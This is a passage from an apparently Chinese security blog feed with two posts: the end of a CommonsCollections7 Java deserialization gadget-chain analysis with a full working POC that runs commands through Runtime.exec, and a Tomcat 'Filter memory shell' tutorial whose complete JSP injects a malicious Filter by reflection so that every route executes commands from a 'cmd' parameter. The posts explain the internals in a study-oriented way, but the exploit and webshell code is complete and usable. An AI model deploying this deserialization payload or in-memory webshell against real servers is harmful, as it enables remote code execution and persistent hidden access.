Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>POC 中有几个问题需要解答。</p><ul><li>为什么<code>Hashtable</code>需要 put 两次？</li></ul><p>在<code>Hashtable#reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法<br><img src="images/image-20221011164109290.png" alt="image-20221011164109290"></p><p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code>elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法<br><img src="images/image-20221011164346546.png" alt="image-20221011164346546"></p><ul><li>为什么<code>lazyMap()</code>需要<code>yy</code>和<code>zZ</code>两个字符串？</li></ul><p>还是<code>reconstitutionPut()</code>方法，<code>e.hash == hash</code>会判断上一个<code>key</code>的<code>hash</code>是否与当前<code>key</code>的<code>hash</code>相等，只有相等才能进入下一步。<br><img src="images/image-20221011165323252.png" alt="image-20221011165323252"></p><p>而字符串<code>yy</code>和<code>zZ</code>经过<code>hashCode()</code>方法计算是相等的<br><img src="images/image-20221011170202472.png" alt="image-20221011170202472"></p><p>那么为什么这两个字符串会相等呢？因为是字符串，所以我们跟进<code>String#hashCode()</code>方法<br><img src="images/image-20221011171013521.png" alt="image-20221011171013521"></p><p>算法就这一句<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = 31 * h + val[i];</span><br></pre></td></tr></table></figure></p><p>首先第一个<code>y</code>的<code>ascii</code>值为 121，而第一个<code>z</code>的<code>ascii</code>值为 122，经过计算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:  y-&gt;121 y-&gt; 121*31 + 121 = 3872</span><br><span class="line">b:  z-&gt;122 ？-&gt; 122*31 + ？  = 3872  -&gt; ? = 90</span><br></pre></td></tr></table></figure></p><p>所以要想<code>a</code>和<code>b</code>经过<code>hashCode()</code>方法计算相等，<code>b</code>的第二个元素就得比<code>a</code>小，结果为<code>Z</code>，<code>Z</code>的<code>ascii</code>值为 90</p><ul><li>为什么最后要<code>remove(&quot;yy&quot;)</code>？</li></ul><p>问题出在<code>AbstractMap#equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等。<br><img src="images/image-20221012102519876.png" alt="image-20221012102519876"></p><p>那么还剩一下问题，为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</p><p>在<code>Hashtable#put()</code>方法时也会调用一次<code>entry.key.equals(key)</code><br><img src="images/image-20221012103923937.png" alt="image-20221012103923937"></p><p>因此在<code>hashtable.put(lazyMap2, 2);</code>之后跟到<code>AbstractMap()#equals()</code>方法<br><img src="images/image-20221012104621160.png" alt="image-20221012104621160"></p><p>这里可以看到，传入<code>LazyMap#get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap#get()</code>方法<br><img src="images/image-20221012104834141.png" alt="image-20221012104834141"></p><p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>]]></content>
    
    
    <summary type="html">CommonsCollections7利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马之Filter</title>
    <link href="http://example.com/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:58:04.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马之Filter"><a href="#Tomcat内存马之Filter" class="headerlink" title="Tomcat内存马之Filter"></a>Tomcat内存马之Filter</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于 Filter 的知识，在前面<a href="../../01-JavaWeb基础/2-Filter/Filter.md">Filter</a>章节已经学习过，这里不再赘述，直接进入分析环节。</p><h2 id="Filter流程分析"><a href="#Filter流程分析" class="headerlink" title="Filter流程分析"></a>Filter流程分析</h2><p>先编写一个简单的 Filter 实现类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;FilterTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问后带上参数执行命令<br><img src="images/image-20221031113025485.png" alt="image-20221031113025485"></p><p>在<code>doFilter()</code>处方法打上断点，看看调用栈<br><img src="images/image-20221031144738930.png" alt="image-20221031144738930"></p><p>从<code>StandardWrapperValve#invoke()</code>方法跟起<br><img src="images/image-20221031144936619.png" alt="image-20221031144936619"></p><p>首先通过<code>ApplicationFilterFactory.createFilterChain()</code>方法创建了一个<code>ApplicationFilterChain</code>类型对象，跟进<code>createFilterChain()</code>方法<br><img src="images/image-20221031145633764.png" alt="image-20221031145633764"></p><p>初始化了<code>ApplicationFilterChain</code>对象，继续往下走<br><img src="images/image-20221031161929404.png" alt="image-20221031161929404"></p><p>接下来获取到了<code>StandardContext</code>类对象<code>context</code>，并通过<code>context.findFilterMaps()</code>方法拿到了<code>filterMaps</code>数组，继续往下走<br><img src="images/image-20221031162125403.png" alt="image-20221031162125403"></p><p>在 if 条件中，请求路径和<code>filterMap</code>设置的规则进行匹配，如果满足则进入 if 条件中，接着根据<code>filterMap</code>对象中存储的<code>filter</code>名称在<code>StandardContext</code>类的<code>filterConfigs</code>寻找<code>filterConfig</code>，如果不为空则通过<code>addFilter()</code>方法添加到<code>filterChain</code>的属性中<br><img src="images/image-20221031162208826.png" alt="image-20221031162208826"></p><p><code>addFilter()</code>方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加<code>filterConfig</code>。</p><p>最后回到<code>StandardWrapperValve</code>类中往下走<br><img src="images/image-20221031151815580.png" alt="image-20221031151815580"></p><p>跟进<code>filterChain.doFilter()</code>方法中<br><img src="images/image-20221031151928083.png" alt="image-20221031151928083"></p><p>继续跟进<code>internalDoFilter()</code>方法<br><img src="images/image-20221031152051403.png" alt="image-20221031152051403"></p><p>创建了<code>ApplicationFilterConfig</code>类对象<code>filterConfig</code>，然后通过<code>filterConfig.getFilter()</code>方法取出<code>filter</code>，接着调用<code>filter.doFilter()</code>方法，跟进后就是我们编写的恶意类<code>FilterTest</code><br><img src="images/image-20221031152224431.png" alt="image-20221031152224431"></p><p>至此步骤算是走完了，总结一下流程：</p><ol><li>通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化<code>ApplicationFilterChain</code>对象；<ul><li>初始化空的<code>ApplicationFilterChain</code>对象；</li><li>获取<code>StandardContext</code>类对象，并中<code>StandardContext</code>类对象中取出<code>FilterMaps</code>数组,<code>FilterMaps</code>数组中的<code>FilterMap</code>存储名称和匹配规则；</li><li>根据<code>FilterMap</code>的名称在<code>StandardContext</code>类的<code>filterConfigs</code>中查找，如果不为空则添加到<code>filterChain</code>对象的属性中；</li></ul></li><li>执行<code>filterChain#doFilter()</code>方法进入编写的恶意实现类<code>FilterTest</code>的<code>doFilter()</code>方法中执行代码。</li></ol><p>接下来再看看<code>Filter</code>的初始化加载流程，把断点打在类名处<br><img src="images/image-20221031160325554.png" alt="image-20221031160325554"></p><p>看看调用栈<br><img src="images/image-20221031160352961.png" alt="image-20221031160352961"></p><p>跟进<code>filterStart()</code>方法<br><img src="images/image-20221031161602064.png" alt="image-20221031161602064"></p><p>遍历 Map 对象<code>filterDefs</code>并获取到<code>entry.getValue()</code>，作为参数传入初始化的<code>ApplicationFilterConfig</code>对象<code>filterConfig</code>，然后通过<code>put()</code>方法把<code>filterConfig</code>添加到<code>filterConfigs</code>中。</p><p>至此我们知道和 filter 有关的三个字段分别为：<code>filterMaps</code>、<code>filterDefs</code>和<code>filterConfigs</code></p><h2 id="Filter内存马的实现"><a href="#Filter内存马的实现" class="headerlink" title="Filter内存马的实现"></a>Filter内存马的实现</h2><p>我们先总结一下这三个字段存储的内容</p><h3 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h3><p><img src="images/image-20221031163323171.png" alt="image-20221031163323171"></p><p>可以看到在<code>filterMaps</code>中以数组的方式存储着 filter 的名称和路径映射信息，其中<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code>是必须的。</p><h3 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h3><p><img src="images/image-20221031163520399.png" alt="image-20221031163520399"></p><p><code>filterDefs</code>以键值对的方式存储<code>filterDef</code>，<code>filterDef</code>为 Map 对象，value 存储着重要的<code>filter</code>、<code>filterClass</code>和<code>filterName</code>。</p><h3 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h3><p><img src="images/image-20221031164103231.png" alt="image-20221031164103231"></p><p><code>filterConfigs</code>存储着当前的上下文<code>StandardContext</code>（WEB 应用），<code>filter</code>对象和<code>filterDef</code>等等信息。</p><p>经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：</p><ol><li>编写恶意的 Filter 实现类；</li><li>获取<code>StandardContext</code>对象；</li><li>利用<code>FilterDef</code>对<code>filter</code>进行封装；</li><li>创建<code>FilterMap</code>，将<code>filterName</code>和<code>urlPatterns</code>进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）</li><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p>最后 Filter 内存马实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">16</span>:<span class="number">51</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTest&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用FilterDef对filter进行封装</span></span><br><span class="line">    <span class="type">FilterTest</span> <span class="variable">filterTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTest</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filterTest);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filterTest.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建FilterMap，将filterName和urlPatterns进行绑定</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装filterConfig和filterDef到filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field_filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field_filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) field_filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到filterConfigs中</span></span><br><span class="line">    filterConfigs.put(filterName,applicationFilterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221031172346671.png" alt="image-20221031172346671"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221031172405231.png" alt="image-20221031172405231"></p>]]></content>
    
    
    <summary type="html">Tomcat内存马之Filter</summary>
    
    
    
    
  </entry>
  
</feed>
